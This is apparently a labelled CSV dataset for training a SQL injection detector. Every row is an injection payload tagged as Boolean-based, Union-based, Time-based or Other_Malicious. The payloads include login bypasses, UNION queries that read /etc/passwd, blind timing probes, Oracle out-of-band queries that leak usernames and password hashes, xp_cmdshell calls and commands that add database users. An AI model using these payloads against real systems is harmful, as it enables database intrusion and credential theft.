Query,Label,Attack_Type
"; if not  (  substring   (    (   select @@version  )  ,24,1  )   <> 1  )   waitfor delay '0:0:2' --",1,Time-based
" select * from users where id  =  1 or 1#""$ union select 1,version  (    )   -- 1",1,Union-based
" select * from users where id  =  1 or 1#""{ union select null,version  (    )   -- 1",1,Union-based
select * from users where id  =  '1' *$ . or 1  =  1 -- 1',1,Boolean-based
select * from users where id  =  1 +$+. or 1  =  1 -- 1,1,Boolean-based
select * from users where id  =  1 or   (  \+  )    =  1 or 1  =  1 -- 1,1,Boolean-based
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",1,Other_Malicious
or 1  =  1 or ''  =  ',1,Boolean-based
select * from users where id  =  1   or 1  =  1 -- 1,1,Boolean-based
or 'text' > 't',1,Other_Malicious
"1234 "" AND 1  =  0 UNION ALL SELECT ""admin"", ""81dc9bdb52d04dc20036dbd8313ed055",1,Union-based
" select * from users where id  =  1 or ""%["" or 1  =  1 -- 1",1,Boolean-based
" select * from users where id  =  1 or 1#"";  =  1 union select 1,version  (    )   -- 1",1,Union-based
admin' or '1'  =  '1'#,1,Boolean-based
select * from users where id  =  1 +$ 1 or 1  =  1 -- 1,1,Boolean-based
s,1,Other_Malicious
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  4   )    )    AND 'i'  =  'i",1,Other_Malicious
 select * from information_schema.tables--,1,Other_Malicious
" select * from users where id  =  1 or ""$&"" or 1  =  1 -- 1",1,Boolean-based
1   )    )    or pg_sleep  (  __TIME__  )  --,1,Time-based
" select * from users where id  =  '1' union select !<@,version  (    )   -- 1'",1,Union-based
declare @q nvarchar   (  200  )   select @q   =   0x770061 ...,1,Other_Malicious
 or 1  =  1 or ''  =  ',1,Boolean-based
select * from users where id  =  1 %!<1 or 1  =  1 -- 1,1,Boolean-based
declare @q nvarchar   (  200  )   select @q   =   0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec  (  @q  ) ,1,Other_Malicious
" select * from users where id  =  1 or ""]1"" or 1  =  1 -- 1",1,Boolean-based
" select * from users where id  =  1 or $+<1 union select 1,@@VERSION -- 1",1,Union-based
or 'unusual'   =   'unusual',1,Other_Malicious
 or 1 in   (  select @@version  )  --,1,Other_Malicious
truncate,1,Other_Malicious
as,1,Other_Malicious
 or 3  =  3 --,1,Boolean-based
" select * from users where id  =  1 ||1 union select 1,banner from v$version where rownum  =  1 -- 1",1,Union-based
" select * from users where id  =  1 <@$$ union select 1,version  (    )   -- 1",1,Union-based
"admin""  )   or   (  ""1""  =  ""1",1,Other_Malicious
" select * from users where id  =  1 or 1#""@ union select 'a',version  (    )   -- 1",1,Union-based
"1  )   or benchmark  (  10000000,MD5  (  1   )    )   #",1,Time-based
" select * from users where id  =  1 union select .1_,version  (    )   -- 1",1,Union-based
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT SYS.DATABASE_NAME FROM DUAL   )    )    AND 'i'  =  'i,1,Other_Malicious
" or 0  =  0 #""",1,Boolean-based
select * from users where id  =  1 %$ 1 or 1  =  1 -- 1,1,Boolean-based
select * from users where id  =  1 %!<@ or 1  =  1 -- 1,1,Boolean-based
"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --",1,Time-based
1  )   or sleep  (  __TIME__  )  #,1,Time-based
" select * from users where id  =  1 or ""1_"" or 1  =  1 -- 1",1,Boolean-based
" select * from users where id  =  1 <1## union select 1,version  (    )   -- 1",1,Union-based
" select * from users where id  =  1 + $+*\ union select null,@@VERSION -- 1",1,Union-based
select * from users where id  =  1. <@ or 1  =  1 -- 1,1,Boolean-based
 or true--,1,Other_Malicious
; execute immediate 'sel' || 'ect us' || 'er',1,Other_Malicious
hi' or 'x'  =  'x';,1,Other_Malicious
select * from users where id  =  1 <@ or 1  =  1 -- 1,1,Boolean-based
" select * from users where id  =  1 or "".,"" or 1  =  1 -- 1",1,Boolean-based
admin' #,1,Other_Malicious
" select * from users where id  =  1 <@$_ union select 1,version  (    )   -- 1",1,Union-based
" select * from users where id  =  1 or "",  (  "" or 1  =  1 -- 1",1,Boolean-based
" select * from users where id  =  1 or "",{"" or 1  =  1 -- 1",1,Boolean-based
" union select 1,load_file  (  '/etc/passwd'  )  ,1,1,1;",1,Union-based
"""  )  ;waitfor delay '0:0:__TIME__'--",1,Time-based
 or 'unusual'   =   'unusual',1,Other_Malicious
"insert into mysql.user   (  user, host, password  )   values   (  'name', 'localhost', password  (  'pass123'   )    )   ",1,Other_Malicious
"admin"" or ""1""  =  ""1""/*",1,Boolean-based
" select * from users where id  =  1 or ""1  (  ""  =  1 or 1  =  1 -- 1",1,Boolean-based
" select * from users where id  =  1 or \<1 union select 1,@@VERSION -- 1",1,Union-based
like,1,Other_Malicious
or username like char  (  37  )  ;,1,Other_Malicious
 )    )    or pg_sleep  (  __TIME__  )  --,1,Time-based
select * from users where id  =  1 or $+<\ or 1  =  1 -- 1,1,Boolean-based
or 3  =  3,1,Other_Malicious
" select * from users where id  =  1 or ""  (  ."" or 1  =  1 -- 1",1,Boolean-based
select * from users where id  =  1 or   (  $+  )    =  1 or 1  =  1 -- 1,1,Boolean-based
exec sp,1,Other_Malicious
" select * from users where id  =  1 or \+<$ union select 1,@@VERSION -- 1",1,Union-based
select * from users where id  =  1 or \<$ or 1  =  1 -- 1,1,Boolean-based
" select * from users where id  =  1.&&1 union select 1,version  (    )   -- 1",1,Union-based
admin' or 1  =  1/*,1,Boolean-based
a' waitfor delay '0:0:10'--,1,Time-based
" select * from users where id  =  1 +  (  \  )   union select null,@@VERSION -- 1",1,Union-based
" select * from users where id  =  1 union select .1$_,version  (    )   -- 1",1,Union-based
and 1 in   (  select var from temp  )  --,1,Other_Malicious
hi'  )   or   (  'a'  =  'a,1,Other_Malicious
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  1   )    )    AND 'i'  =  'i",1,Other_Malicious
"admin"" or 1  =  1",1,Boolean-based
"""  )   or true--",1,Other_Malicious
" select * from users where id  =  '1' or $ .  =  1 union select 1,@@VERSION -- 1'",1,Union-based
" select * from users where id  =  1 or ""  (  {"" or 1  =  1 -- 1",1,Boolean-based
1  )   or pg_sleep  (  __TIME__  )  --,1,Time-based
" select * from users where id  =  1 or ""{."" or 1  =  1 -- 1",1,Boolean-based
"""  )   or sleep  (  __TIME__  )    =  """,1,Time-based
select * from users where id  =  1.<@. or 1  =  1 -- 1,1,Boolean-based
"admin""  )   or   (  ""1""  =  ""1""--",1,Other_Malicious
" select * from users where id  =  1<@.. union select 1,version  (    )   -- 1",1,Union-based
; exec xp_regread,1,Other_Malicious
" select * from users where id  =  '1' + @ 1 union select 1,version  (    )   -- 1'",1,Union-based
select * from users where id  =  1 + \+%1 or 1  =  1 -- 1,1,Boolean-based
" select * from users where id  =  1 or "";1"" or 1  =  1 -- 1",1,Boolean-based
" select * from users where id  =  1 or ""%&"" or 1  =  1 -- 1",1,Boolean-based
1 and 1  =  1,1,Boolean-based
or 0  =  0 #,1,Other_Malicious
union select * from users where login   =   char ...,1,Union-based
" select * from users where id  =  1 union select 1||@,version  (    )   -- 1",1,Union-based
admin'  )   or '1'  =  '1'--,1,Boolean-based
1;SELECT *,1,Other_Malicious
" select * from users where id  =  1 or ""{;"" or 1  =  1 -- 1",1,Boolean-based
x' and 1  =    (  select count  (  *  )   from tabname  )  ; --,1,Other_Malicious
" select * from users where id  =  '1' or """"<@ union select 1,version  (    )   -- 1'",1,Union-based
" select * from users where id  =  1 or ""?,"" or 1  =  1 -- 1",1,Boolean-based
" select * from users where id  =  '1' ||1 union select 1,banner from v$version where rownum  =  1 -- 1'",1,Union-based
"1 or benchmark  (  10000000,MD5  (  1   )    )   #",1,Time-based
procedure,1,Other_Malicious
or ''  =  ',1,Other_Malicious
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT SYS.LOGIN_USER FROM DUAL   )    )    AND 'i'  =  'i,1,Other_Malicious
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  2   )    )    AND 'i'  =  'i",1,Other_Malicious
\'; desc users; --,1,Other_Malicious
" select * from users where id  =  1 or   (  \.  )    =  1 union select 1,@@VERSION -- 1",1,Union-based
select * from users where id  =  '1' or $ 1  =  1 or 1  =  1 -- 1',1,Boolean-based
""" or """"^""",1,Other_Malicious
"""-""",1,Other_Malicious
" select * from users where id  =  1 or \<   =  1 union select 1,@@VERSION -- 1",1,Union-based
" select * from users where id  =  1 union select 1<@$,version  (    )   -- 1",1,Union-based
" select * from users where id  =  1 *\ union select null,@@VERSION -- 1",1,Union-based
" select * from users where id  =  '1' or !<@ union select 1,version  (    )   -- 1'",1,Union-based
" select * from users where id  =  1 or "".%"" or 1  =  1 -- 1",1,Boolean-based
admin'/*,1,Other_Malicious
" select * from users where id  =  1 or ""  (  #"" or 1  =  1 -- 1",1,Boolean-based
||UTL_HTTP.REQUEST,1,Other_Malicious
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  1   )    )    AND 'i'  =  'i",1,Other_Malicious
" select * from users where id  =  '1'<@.. union select 1,version  (    )   -- 1'",1,Union-based
"""   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #",1,Time-based
" select * from users where id  =  1 <@.$ union select 1,version  (    )   -- 1",1,Union-based
" select * from users where id  =  1 or $ .  =  1 union select 1,@@VERSION -- 1",1,Union-based
select * from users where id  =  '1' <@.$ or 1  =  1 -- 1',1,Boolean-based
1 uni/**/on select all from where,1,Other_Malicious
" select * from users where id  =  1 +$ . union select null,@@VERSION -- 1",1,Union-based
" select * from users where id  =  1 or 1#""? union select null,version  (    )   -- 1",1,Union-based
admin'  )   or '1'  =  '1'#,1,Boolean-based
||utl_http.request  (  'httP://192.168.1.1/'  )  ||',1,Other_Malicious
or '7659'  =  '7659,1,Other_Malicious
" select * from users where id  =  1 or ""{@"" or 1  =  1 -- 1",1,Boolean-based
" select * from users where id  =  1 union select +!<1,version  (    )   -- 1",1,Union-based
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",1,Other_Malicious
" select * from users where id  =  1 or ""  (  @"" or 1  =  1 -- 1",1,Boolean-based
or true--,1,Other_Malicious
" select * from users where id  =  1 union select !<1,version  (    )   -- 1",1,Union-based
" select * from users where id  =  '1' union select \#,@@VERSION -- 1'",1,Union-based
" select * from users where id  =  1 or 1#""{ union select 1,version  (    )   -- 1",1,Union-based
""" or true--",1,Other_Malicious
select * from users where id  =  1. or 1  =  1 -- 1,1,Boolean-based
" select * from users where id  =  1 or @#"",  =  1 union select 1,version  (    )   -- 1",1,Union-based
" select * from users where id  =  1 or "";@"" or 1  =  1 -- 1",1,Boolean-based
â or 3  =  3 --,1,Boolean-based
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT global_name FROM global_name   )    )    AND 'i'  =  'i,1,Other_Malicious
" select * from users where id  =  1 +1 union select null,banner from v$version where rownum  =  1 -- 1",1,Union-based
" select * from users where id  =  1 or "",,""  =  1 or 1  =  1 -- 1",1,Boolean-based
" select * from users where id  =  1 + $+%1 union select null,@@VERSION -- 1",1,Union-based
" select * from users where id  =  1 or 1#""? union select version  (    )  ,version  (    )   -- 1",1,Union-based
" select * from users where id  =  1 or ""  )  1"" or 1  =  1 -- 1",1,Boolean-based
 or uid like '%,1,Other_Malicious
select * from users where id  =  '1' <@&1 or 1  =  1 -- 1',1,Boolean-based
" select * from users where id  =  '1' union select !<1,version  (    )   -- 1'",1,Union-based
23 or 1  =  1; --,1,Boolean-based
" select * from users where id  =  1 or \<\. union select 1,@@VERSION -- 1",1,Union-based
" select * from users where id  =  1 or ""{  (  ""  =  1 or 1  =  1 -- 1",1,Boolean-based
" select * from users where id  =  1 or ""%_"" or 1  =  1 -- 1",1,Boolean-based
select * from users where id  =  1 +   (  \.  )   or 1  =  1 -- 1,1,Boolean-based
" select * from users where id  =  '1' union select \,@@VERSION -- 1'",1,Union-based
0 or 1  =  1,1,Boolean-based
select * from users where id  =  1 &@ or 1  =  1 -- 1,1,Boolean-based
"admin""  )   or ""1""  =  ""1",1,Boolean-based
select * from users where id  =  1 or \<   =  1 or 1  =  1 -- 1,1,Boolean-based
" select * from users where id  =  1 or ""??"" or 1  =  1 -- 1",1,Boolean-based
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i",1,Other_Malicious
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  7   )    )    AND 'i'  =  'i",1,Other_Malicious
&apos; OR,1,Other_Malicious
sqlvuln;,1,Other_Malicious
select * from users where id  =  1 + $+%$ or 1  =  1 -- 1,1,Boolean-based
select * from users where id  =  '1' + $+%\ or 1  =  1 -- 1',1,Boolean-based
""" or """"*""",1,Other_Malicious
"hi or 1  =  1 --""",1,Boolean-based
" select * from users where id  =  1. union select null,banner from v$version where rownum  =  1 -- 1",1,Union-based
; exec master..xp_cmdshell 'ping 172.10.1.255'--,1,Other_Malicious
" select * from users where id  =  '1' or 1^  =  1 union select 1,banner from v$version where rownum  =  1 -- 1'",1,Union-based
" select * from users where id  =  '1' union select ""?""_,version  (    )   -- 1'",1,Union-based
select * from information_schema.tables--,1,Other_Malicious
select * from users where id  =  1 or \<\. or 1  =  1 -- 1,1,Boolean-based
   (  select top 1,1,Other_Malicious
Ã½ or 1  =  1 --,1,Boolean-based
a' --,1,Other_Malicious
 or 1  =  1 /*,1,Boolean-based
" select * from users where id  =  1 or 1#"", union select null,version  (    )   -- 1",1,Union-based
" select * from users where id  =  '1' union select $ .,@@VERSION -- 1'",1,Union-based
--,1,Other_Malicious
"exec sp_addlogin 'name' , 'password'",1,Other_Malicious
" select * from users where id  =  1   union select null,banner from v$version where rownum  =  1 -- 1",1,Union-based
0x77616974666F722064656C61792027303A303A31302700 exec  (  @s  ) ,1,Other_Malicious
" select * from users where id  =  1 or "".  )  "" or 1  =  1 -- 1",1,Boolean-based
" select * from users where id  =  1 or @<@  =  1 union select 1,version  (    )   -- 1",1,Union-based
group by userid having 1  =  1--,1,Other_Malicious
" select * from users where id  =  1 + \+%1 union select null,@@VERSION -- 1",1,Union-based
select * from users where id  =  1 *1 or 1  =  1 -- 1,1,Boolean-based
" select * from users where id  =  1 or @#"";  =  1 or 1  =  1 -- 1",1,Boolean-based
‘ or 1  =  1 --,1,Boolean-based
" select * from users where id  =  1 *\. union select null,@@VERSION -- 1",1,Union-based
select * from users where id  =  1 %  (  @  )   or 1  =  1 -- 1,1,Boolean-based
or 'a'  =  'a,1,Other_Malicious
declare @s varchar  (  22  )   select @s   = ,1,Other_Malicious
" select * from users where id  =  1 union select 1<@,version  (    )   -- 1",1,Union-based
" select * from users where id  =  1 + \+*\ union select null,@@VERSION -- 1",1,Union-based
" select * from users where id  =  1 or 1#"". union select version  (    )  ,version  (    )   -- 1",1,Union-based
@variable,1,Other_Malicious
; exec master..xp_cmdshell,1,Other_Malicious
select * from users where id  =  1 +  (  1  )   or 1  =  1 -- 1,1,Boolean-based
" select * from users where id  =  1 union select @ 1$,version  (    )   -- 1",1,Union-based
" select * from users where id  =  1 union select @ 1a,version  (    )   -- 1",1,Union-based
" select * from users where id  =  1 or  @$#  =  1 union select 1,version  (    )   -- 1",1,Union-based
" select * from users where id  =  '1' or   (  \.  )    =  1 union select 1,@@VERSION -- 1'",1,Union-based
 and 1 in   (  select var from temp  )  --,1,Other_Malicious
" select * from users where id  =  '1' union select 1""!"",banner from v$version where rownum  =  1 -- 1'",1,Union-based
" select * from users where id  =  1 or ""1]"" or 1  =  1 -- 1",1,Boolean-based
" select * from users where id  =  1 or ""$?"" or 1  =  1 -- 1",1,Boolean-based
or x  =  x,1,Other_Malicious
or a  =  a,1,Other_Malicious
or '1'  =  '1,1,Other_Malicious
" select * from users where id  =  11<1# union select 1,version  (    )   -- 1",1,Union-based
   )    )    or    (    (   'x'   )    )     =     (    (   'x,1,Other_Malicious
" select * from users where id  =  '1' or \.<1 union select 1,@@VERSION -- 1'",1,Union-based
" select * from users where id  =  '1' <@&1 union select 1,version  (    )   -- 1'",1,Union-based
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  4   )    )    AND 'i'  =  'i",1,Other_Malicious
; if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --,1,Time-based
select * from users where id  =  1 <@<@ or 1  =  1 -- 1,1,Boolean-based
" select * from users where id  =  1 union select @<@$,version  (    )   -- 1",1,Union-based
" select * from users where id  =  '1' <@<@ union select 1,version  (    )   -- 1'",1,Union-based
" select * from users where id  =  1 or ""$_"" or 1  =  1 -- 1",1,Boolean-based
" select * from users where id  =  1 or 1#""{ union select version  (    )  ,version  (    )   -- 1",1,Union-based
a' or 1  =  1--,1,Boolean-based
 )   or   (  a  =  a,1,Other_Malicious
"""   )    )    or    (    (   ""x""   )    )     =     (    (   ""x",1,Other_Malicious
" select * from users where id  =  1 or 1#""; or 1  =  1 -- 1",1,Boolean-based
" select * from users where id  =  '1' <@$_ union select 1,version  (    )   -- 1'",1,Union-based
-- &password  = ,1,Other_Malicious
select * from users where id  =  1 <@. or 1  =  1 -- 1,1,Boolean-based
" select * from users where id  =  1 or ""  (    )  "" or 1  =  1 -- 1",1,Boolean-based
" select * from users where id  =  1 %$ 1 union select null,@@VERSION -- 1",1,Union-based
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  3   )    )    AND 'i'  =  'i",1,Other_Malicious
 or '1'  =  '1,1,Boolean-based
admin' or 1  =  1,1,Boolean-based
" select * from users where id  =  1 or "";,""  =  1 or 1  =  1 -- 1",1,Boolean-based
" select * from users where id  =  1 union select @||1,version  (    )   -- 1",1,Union-based
" select * from users where id  =  1 +\+. union select null,@@VERSION -- 1",1,Union-based
" select * from users where id  =  1 or ""  )  ,"" or 1  =  1 -- 1",1,Boolean-based
" union select * from users where login   =   char  (  114,111,111,116  )  ;",1,Union-based
" select * from users where id  =  1 or 1#""? union select 1,version  (    )   -- 1",1,Union-based
 or 1  =  1--,1,Boolean-based
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i",1,Other_Malicious
pg_sleep  (  __TIME__  )  --,1,Time-based
‘ or 3  =  3 --,1,Boolean-based
" select * from users where id  =  1 -1<@ union select 1,version  (    )   -- 1",1,Union-based
" select * from users where id  =  1 or ""$#"" or 1  =  1 -- 1",1,Boolean-based
 )   union select * from information_schema.tables;,1,Union-based
